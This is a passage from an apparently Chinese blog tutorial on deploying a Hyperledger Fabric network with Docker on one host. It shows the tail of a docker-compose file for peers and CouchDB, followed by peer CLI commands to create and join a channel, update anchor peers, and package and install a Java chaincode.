class="ruby"> <span class="hljs-string">&quot;orderer0.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;orderer1.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;orderer2.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer0.org1.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer1.org1.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer0.org2.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer1.org2.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>        environment:<br>            -<span class="ruby"> FABRIC_LOGGING_SPEC=INFO</span><br><span class="ruby"></span>            -<span class="ruby"> FABRIC_LOGGING_FORMAT=<span class="hljs-string">&quot;%&#123;color&#125;%&#123;time:2006-01-02 15:04:05.000 MST&#125; [%&#123;module&#125;] %&#123;shortfunc&#125; -&gt; %&#123;level:.4s&#125; %&#123;id:03x&#125;%&#123;color:reset&#125; %&#123;message&#125;&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_ADDRESSAUTODETECT=<span class="hljs-literal">false</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=host  <span class="hljs-comment"># uncomment this to use specific network</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_USELEADERELECTION=<span class="hljs-literal">true</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_ORGLEADER=<span class="hljs-literal">false</span>  <span class="hljs-comment"># whether this node is the org leader, default to false</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_OPERATIONS_LISTENADDRESS=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:</span><span class="hljs-number">9443</span>  <span class="hljs-comment"># operation RESTful API</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_METRICS_PROVIDER=prometheus  <span class="hljs-comment"># prometheus will pull metrics from fabric via /metrics RESTful API</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_PROFILE_ENABLED=<span class="hljs-literal">false</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_TLS_ENABLED=<span class="hljs-literal">true</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_TLS_CERT_FILE=<span class="hljs-regexp">/etc/hyperledger</span><span class="hljs-regexp">/fabric/tls</span><span class="hljs-regexp">/server.crt</span></span><br><span class="hljs-regexp"><span class="ruby"></span></span>            -<span class="ruby"><span class="hljs-regexp"> CORE_PEER_TLS_KEY_FILE=/etc</span><span class="hljs-regexp">/hyperledger/fabric</span><span class="hljs-regexp">/tls/server</span>.key</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/etc/hyperledger</span><span class="hljs-regexp">/fabric/tls</span><span class="hljs-regexp">/ca.crt</span></span><br><span class="hljs-regexp"><span class="ruby"></span></span>            -<span class="ruby"><span class="hljs-regexp"> CORE_CHAINCODE_BUILDER=hyperledger/fabric</span>-<span class="hljs-symbol">ccenv:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_CHAINCODE_GOLANG_RUNTIME=hyperledger/fabric-<span class="hljs-symbol">baseos:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_CHAINCODE_JAVA_RUNTIME=hyperledger/fabric-<span class="hljs-symbol">javaenv:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_CHAINCODE_NODE_RUNTIME=hyperledger/fabric-<span class="hljs-symbol">nodeenv:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_ID=peer1.org2.example.com</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_ADDRESS=peer1.org2.example.<span class="hljs-symbol">com:</span><span class="hljs-number">10051</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_CHAINCODELISTENADDRESS=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:</span><span class="hljs-number">7052</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_CHAINCODEADDRESS=peer1.org2.example.<span class="hljs-symbol">com:</span><span class="hljs-number">10052</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_EXTERNALENDPOINT=peer1.org2.example.<span class="hljs-symbol">com:</span><span class="hljs-number">10051</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_BOOTSTRAP=peer1.org2.example.<span class="hljs-symbol">com:</span><span class="hljs-number">10051</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_LOCALMSPID=Org2MSP</span><br><span class="ruby"></span>            -<span class="ruby"> FABRIC_LOGGING_SPEC=DEBUG <span class="hljs-comment"># info:core.chaincode=debug</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_STATEDATABASE=CouchDB</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS=peer1.org2.<span class="hljs-symbol">couchdb:</span><span class="hljs-number">5984</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_COUCHDBCONFIG_USERNAME=admin</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD=adminpw</span><br><span class="ruby"></span>        volumes:<br>            -<span class="ruby"> /var/run/docker.<span class="hljs-symbol">sock:</span>/var/run/docker.sock</span><br><span class="ruby"></span>            -<span class="ruby"> ./crypto-config/peerOrganizations/org2.example.com/peers/peer1.org2.example.com/<span class="hljs-symbol">msp:</span>/etc/hyperledger/fabric/msp</span><br><span class="ruby"></span>            -<span class="ruby"> ./crypto-config/peerOrganizations/org2.example.com/peers/peer1.org2.example.com/<span class="hljs-symbol">tls:</span>/etc/hyperledger/fabric/tls</span><br><span class="ruby"></span>        expose:<br>            -<span class="ruby"> <span class="hljs-string">&quot;10051&quot;</span>  <span class="hljs-comment"># gRPC</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;9446&quot;</span>  <span class="hljs-comment"># Operation REST</span></span><br><span class="ruby"></span>        #command: bash -c &#x27;bash /tmp/peer_build.sh; peer node start&#x27;<br>        command: peer node start<br>        depends_on:<br>            -<span class="ruby"> peer1.org2.couchdb</span><br><span class="ruby"></span><br><br>    peer0.org2.couchdb:<br>        image: couchdb:3.1.1<br>        container_name: peer0.org2.couchdb<br>        restart: always<br>        ports:<br>            -<span class="ruby"> <span class="hljs-number">7984</span><span class="hljs-symbol">:</span><span class="hljs-number">5984</span>  <span class="hljs-comment"># this is the restful API addr, can also access fauxton web ui thru http://localhost:5984/_utils/</span></span><br><span class="ruby"></span>        environment:<br>            -<span class="ruby"> COUCHDB_USER=admin</span><br><span class="ruby"></span>            -<span class="ruby"> COUCHDB_PASSWORD=adminpw</span><br><span class="ruby"></span><br>    peer1.org2.couchdb:<br>        image: couchdb:3.1.1<br>        container_name: peer1.org2.couchdb<br>        restart: always<br>        ports:<br>            -<span class="ruby"> <span class="hljs-number">8984</span><span class="hljs-symbol">:</span><span class="hljs-number">5984</span>  <span class="hljs-comment"># this is the restful API addr, can also access fauxton web ui thru http://localhost:5984/_utils/</span></span><br><span class="ruby"></span>        environment:<br>            -<span class="ruby"> COUCHDB_USER=admin</span><br><span class="ruby"></span>            -<span class="ruby"> COUCHDB_PASSWORD=adminpw</span><br></code></pre></td></tr></table></figure><p>其中docker在启动的时候同时会启动两个couchdb容器，通过访问<a href="http://localhost:5984/_utils/%E5%8F%AF%E4%BB%A5%E5%88%86%E5%88%AB%E8%AE%BF%E9%97%AE%E5%88%B0%E4%B8%8D%E5%90%8Cpeer%E8%8A%82%E7%82%B9%E7%9A%84couchdb%E4%B8%AD%EF%BC%8C%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E5%8F%AF%E4%BB%A5%E5%9C%A8docker%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E8%87%AA%E5%AE%9A%E4%B9%89%E3%80%82">http://localhost:5984/_utils/可以分别访问到不同peer节点的couchdb中，账户密码可以在docker的配置文件中自定义。</a></p><p>启动的容器如图所示：</p><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220407200455760.png" alt="docker容器列表"></p><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220407200524124.png" alt="docker容器列表"></p><p>通过客户端cli server中创建通道然后加入通道在私有节点上安装链码等等</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> fabric-cli bash<br></code></pre></td></tr></table></figure><p>创建一个bussinesschannel通道并让四个节点都加入通道中</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">APP_CHANNEL</span>=businesschannel<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">TIMEOUT</span>=30<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=Org1MSP<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=/etc/hyperledger/fabric/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>channel create -o orderer0.example.com:7050 -c <span class="hljs-variable">$&#123;APP_CHANNEL&#125;</span> -f <span class="hljs-string">&quot;/tmp/channel-artifacts/<span class="hljs-variable">$APP_CHANNEL</span>.tx&quot;</span> --timeout <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;TIMEOUT&#125;</span>s&quot;</span> --tls --cafile /etc/hyperledger/fabric/crypto-config/ordererOrganizations/example.com/orderers/orderer0.example.com/msp/tlscacerts/tlsca.example.com-cert.pem<br></code></pre></td></tr></table></figure><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220407201129927.png" alt="businesschannel.block生成"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">mv businesschannel.block <span class="hljs-regexp">/tmp/</span>channel-<span class="hljs-keyword">artifacts</span>/<br></code></pre></td></tr></table></figure><p>加入通道</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gradle">docker exec -it fabric-cli bash<br>#org1-peer0节点<br>export CORE_PEER_TLS_ENABLED=<span class="hljs-keyword">true</span><br>export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org1MSP&quot;</span><br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org1.example.com<span class="hljs-regexp">/peers/</span>peer0.org1.example.com<span class="hljs-regexp">/tls/</span>ca.crt<br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org1.example.com<span class="hljs-regexp">/users/</span>Admin@org1.example.com/msp<br>export CORE_PEER_ADDRESS=peer0.org1.example.com:<span class="hljs-number">7051</span><br><br>peer channel <span class="hljs-keyword">join</span> -b <span class="hljs-regexp">/tmp/</span>channel-<span class="hljs-keyword">artifacts</span>/businesschannel.block<br><br>#org1-peer1节点<br>export CORE_PEER_TLS_ENABLED=<span class="hljs-keyword">true</span><br>export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org1MSP&quot;</span><br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org1.example.com<span class="hljs-regexp">/peers/</span>peer1.org1.example.com<span class="hljs-regexp">/tls/</span>ca.crt<br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org1.example.com<span class="hljs-regexp">/users/</span>Admin@org1.example.com/msp<br>export CORE_PEER_ADDRESS=peer1.org1.example.com:<span class="hljs-number">8051</span><br><br><br>peer channel <span class="hljs-keyword">join</span> -b <span class="hljs-regexp">/tmp/</span>channel-<span class="hljs-keyword">artifacts</span>/businesschannel.block<br></code></pre></td></tr></table></figure><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220407201530947.png" alt="加入通道结果图1"></p><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220407201548190.png" alt="加入通道结果图2"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#org2-peer0加入通道<br>export CORE_PEER_TLS_ENABLED=<span class="hljs-keyword">true</span><br>export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org2MSP&quot;</span><br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/peers/</span>peer0.org2.example.com<span class="hljs-regexp">/tls/</span>ca.crt<br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/users/</span>Admin@org2.example.com/msp<br>export CORE_PEER_ADDRESS=peer0.org2.example.com:<span class="hljs-number">9051</span><br><br>peer channel <span class="hljs-keyword">join</span> -b <span class="hljs-regexp">/tmp/</span>channel-<span class="hljs-keyword">artifacts</span>/businesschannel.block<br></code></pre></td></tr></table></figure><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220407201853548.png" alt="加入通道结果图3"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#org2-peer1 加入通道<br>export CORE_PEER_TLS_ENABLED=<span class="hljs-keyword">true</span><br>export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org2MSP&quot;</span><br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/peers/</span>peer0.org2.example.com<span class="hljs-regexp">/tls/</span>ca.crt<br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/users/</span>Admin@org2.example.com/msp<br>export CORE_PEER_ADDRESS=peer1.org2.example.com:<span class="hljs-number">10051</span><br><br>peer channel <span class="hljs-keyword">join</span> -b <span class="hljs-regexp">/tmp/</span>channel-<span class="hljs-keyword">artifacts</span>/businesschannel.block<br></code></pre></td></tr></table></figure><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220407201925263.png" alt="加入通道结果图4"></p><p>org1和org2的peer都加入通道中</p><h3 id="更新锚节点"><a href="#更新锚节点" class="headerlink" title="更新锚节点"></a>更新锚节点</h3><p>org1 更新锚节点：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">export CORE_PEER_TLS_ENABLED=<span class="hljs-keyword">true</span><br>export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org1MSP&quot;</span><br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org1.example.com<span class="hljs-regexp">/peers/</span>peer0.org1.example.com<span class="hljs-regexp">/tls/</span>ca.crt<br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org1.example.com<span class="hljs-regexp">/users/</span>Admin@org1.example.com/msp<br>export CORE_PEER_ADDRESS=peer0.org1.example.com:<span class="hljs-number">7051</span><br><br>peer channel update -o orderer0.example.com:<span class="hljs-number">7050</span> -c businesschannel -f <span class="hljs-regexp">/tmp/</span>channel-<span class="hljs-keyword">artifacts</span><span class="hljs-regexp">/Org1MSPanchors.tx --tls --cafile /</span>etc<span class="hljs-regexp">/hyperledger/</span>fabric<span class="hljs-regexp">/crypto-config/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer0.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br></code></pre></td></tr></table></figure><p>org2 更新锚节点：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">export CORE_PEER_TLS_ENABLED=<span class="hljs-keyword">true</span><br>export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org2MSP&quot;</span><br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/peers/</span>peer0.org2.example.com<span class="hljs-regexp">/tls/</span>ca.crt<br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/users/</span>Admin@org2.example.com/msp<br>export CORE_PEER_ADDRESS=peer0.org2.example.com:<span class="hljs-number">7051</span><br><br>peer channel update -o orderer0.example.com:<span class="hljs-number">7050</span> -c businesschannel -f <span class="hljs-regexp">/tmp/</span>channel-<span class="hljs-keyword">artifacts</span><span class="hljs-regexp">/Org2MSPanchors.tx --tls --cafile /</span>etc<span class="hljs-regexp">/hyperledger/</span>fabric<span class="hljs-regexp">/crypto-config/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer0.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br></code></pre></td></tr></table></figure><p>锚节点配置更新后，同一通道内不同组织之间的Peer也可以进行Gossip通信，共同维护通道账本。后续，用户可以通过智能合约使用通道账本。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">discover </span>--configFile <span class="hljs-keyword">discover_config.yaml </span>endorsers --channel <span class="hljs-keyword">businesschannel </span>--chaincode hyperledger-fabric-contruct-<span class="hljs-keyword">java-demo </span>--server peer0-<span class="hljs-keyword">org1-examplem.com:7051</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">discover </span>--configFile <span class="hljs-keyword">discover_config.yaml </span>peers --channel <span class="hljs-keyword">businesschannel </span>--server peer0-<span class="hljs-keyword">org1-examplem.com:7051</span><br></code></pre></td></tr></table></figure><h3 id="安装链码"><a href="#安装链码" class="headerlink" title="安装链码"></a>安装链码</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#编译打包源码<br>mvn <span class="hljs-keyword">compile</span> <span class="hljs-keyword">package</span> -DskipTests -Dmaven.test.skip=<span class="hljs-keyword">true</span><br>#打包链码包<br>peer lifecycle chaincode <span class="hljs-keyword">package</span> hyperledger-fabric-contract-java-demo.tar.gz --path <span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>chaincodes/ --lang java --label hyperledger-fabric-contract-java-demo_1<br></code></pre></td></tr></table></figure><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220407202612838.png" alt="打包链码"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#peer节点安装链码</span><br><span class="hljs-comment">#并不是所有peer节点都需要安装链码，如果peer节点要作为一个背书节点那么就需要安装链码包的</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ENABLED</span>=<span class="hljs-literal">true</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org1MSP&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=/etc/hyperledger/fabric/crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=/etc/hyperledger/fabric/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=peer0.org1.example.com:7051<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install hyperledger-fabric-contract-java-demo.tar.gz<br></code></pre></td></tr></table></figure><p><img src="/2022/04/13/docker%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%E7%94%9F%E4%BA%A7%E7%BD%91%E7%BB%9C/image-20220407202836601.png" alt="安装链码"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ENABLED</span>=<span class="hljs-literal">true</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org1MSP&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=/etc/hyperledger/fabric/crypto-config/peerOrganizations/org1.example.com/peers/peer1.org1.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=/etc/hyperledger/fabric/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=peer1.org1.example.com:8051<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install hyperledger-fabric-contract-java-demo.tar.gz<br><br><br>return:<br>[020 04-07 12:29:10.75 UTC] [cli.lifecycle.chaincode] submitInstallProposal -&gt; <span class="hljs-builtin-name">INFO</span> Installed remotely: response:&lt;status:200 payload:<span class="hljs-string">&quot;\nhhyperledger-fabric-contract-java-demo_1:7b2d658f6068eb32c2cf030c42bf2df05bbdd3514a2a94cbbd33b8229849d90e\022&#x27;hyperledger-fabric-contract-java-demo_1&quot;</span> &gt; <br>[021 04-07 12:29:10.75 UTC] [cli.lifecycle.chaincode] submitInstallProposal -&gt; <span class="hljs-builtin-name">INFO</span> Chaincode code package identifier: hyperledger-fabric-contract-java-demo_1:7b2d658f6068eb32c2cf030c42bf2df05bbdd3514a2a94cbbd33b8229849d90e<br><br></code></pre></td></tr></table></figure><p>org2-peer0和peer1</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ENABLED</span>=<span class="hljs-literal">true</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org2MSP&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=/etc/hyperledger/fabric/crypto-config/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=/etc/hyperledger/fabric/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=peer0.org2.example.com:9051<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install hyperledger-fabric-contract-java-demo.tar.gz<br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ENABLED</span>=<span class="hljs-literal">true</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org2MSP&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=/etc/hyperledger/fabric/crypto-config/peerOrganizations/org2.example.com/peers/peer1.org2.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=/etc/hyperledger/fabric/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=peer1.org2.example.com:10051<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install hyperledger-fabric-contract-java-demo.tar.gz<br></code></pre></td></tr></table></figure><p>查询包ID：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">peer</span> lifecycle chaincode queryinstalled<br><br><span class="hljs-comment">#以peer1的身份，因为使用的是org2-peer1的环境变量</span><br><span class="hljs-attribute">Installed</span> 